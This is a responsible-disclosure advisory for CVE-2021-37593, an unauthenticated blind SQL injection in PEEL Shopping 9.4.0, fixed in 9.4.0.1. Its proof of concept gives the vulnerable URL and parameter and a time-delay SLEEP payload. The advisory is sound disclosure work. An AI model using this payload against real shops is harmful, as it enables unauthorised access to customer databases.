
**Title:** Unauthenticated Blind SQL Injection vulnerability In PEEL Shopping 

**Product:** PEEL Shopping

**Vulnerable Version:** 9.4.0 

**Fixed Version:** 9.4.0.1 

**CVE ID:** CVE-2021-37593 

**Impact:** Critical 

**CVSS v3 Score:** 9.1 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Homepage:** https://www.peel-shopping.com/

**Date of Discovery:** 10 July 2021

**Author:** Mohammad Faisal Sammio | NetbyteSEC


----

## Vendor/product description:

*"PEEL SHOPPING is a free ecommerce CMS in PHP / MySQL, that is to say a a modern and safety management tool that lets you manage your product catalog, the text on your website and everything else from a single, simple and efficient administrative interface. Since 2004, PEEL brings innovation and reliability to the world of e-commerce by offering tailored solutions to create complete and simple online shops at suitable prices for everyone."
Source: https://www.peel-shopping.com/*



## Vulnerability overview:

PEEL Shopping version 9.4.0 allows remote SQL injection. A public user/guest (unauthenticated) can inject a malicious SQL query in order to affect the execution of predefined SQL commands. Upon a successful SQL injection attack, an attacker can read sensitive data from the database and possibly modify database data.



## Proof Of Concept:
 
- The following concept could be used to perform blind SQL injection attack:

      METHOD : GET
      PARAMETER : id
      PAYLOAD : (SELECT * FROM (SELECT(SLEEP(5)))NBSX)
      URL : http://localhost/peel-shopping_9.4.0/achat/produit_details.php?id=[SQL-INJECTION]

- As a proof of concept for exploiting the blind SQL injection, requesting the following URL will cause a time delay.

      http:// localhost/peel-shopping_9.4.0/achat/produit_details.php?id=(SELECT * FROM (SELECT(SLEEP(5)))NBSX)


## Tested Versions: 

The vulnerability has been verified to exist in the PEEL Shopping version 9.4.0. It was found in this version, which was updated and released below a week just prior to the discovery.


## Vendor Contact Timeline:

    2021-07-10: Contacting vendor through email.
    2021-07-12: Request update from vendor, sending advisory draft and proof of concept.
    2021-07-13: Vendor acknowledge and confirms security issue.
    2021-07-14: Vendor response with security patches available on their website.
    2021-07-26: Public release of security advisory
 
## Solution:

Update to latest version 9.4.0.1 on their website.

https://www.peel-shopping.com/modules/telechargement/telecharger.php?id=7


